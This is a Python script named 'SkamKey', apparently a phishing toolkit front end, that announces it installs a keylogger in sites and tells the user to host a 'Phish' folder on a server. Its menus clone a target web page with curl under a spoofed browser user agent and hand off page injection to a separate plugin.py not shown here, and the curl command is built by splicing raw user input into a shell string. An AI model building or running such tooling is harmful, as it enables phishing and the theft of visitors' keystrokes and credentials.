import os , sys , fileinput , subprocess
###You can change the User Agent here###
UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink
def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)

def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()
clear()
def menu1():
    clear()
    target =input(S12+'Target Page > '+S10)
    clear()
    output=input(S12+'Output > '+S10)
    UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
    cmd = ("curl --user-agent '"+UserA+"' "+target+" > "+output)
    os.system(cmd)
    clear()
def menu3():
    clear()
    print('comming soon')
    exit()
def main1():
    clear()
    print("""\n\n\n\n\nChoose option\n#1-Inject a Downloaded page\n#2-Frame method(No download needed)\n""")
    mn1 = input(S12+'OutPhish > '+S10)
    if mn1 == '1':
        cmd1 = "python plugin.py"
        os.system(cmd1)
        subprocess.run(cmd1)
        print()
        exit()
    if mn1 == '2':
        clear()
        menu3()
        exit()
    else:
        clear()
        input('Error....\n')
        main1()
def main():
    clear()
    print('Welcome to SkamKey,\nMade by Out-Shit https://github.com/Out-Shit\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\n')
    input()
    clear()
    print("""\n\n\n\n\nChoose option\n#1-Download page\n#2-Inject the page\n""")
    mn = input(S12+'OutPhish > '+S10)
    if mn == '1':
        clear()
        menu1()
        exit()
    if mn == '2':
        clear()
        main1()
        exit()
    else:
        clear()
        input('Error....\n')
        main()
        exit()
main()
exit()
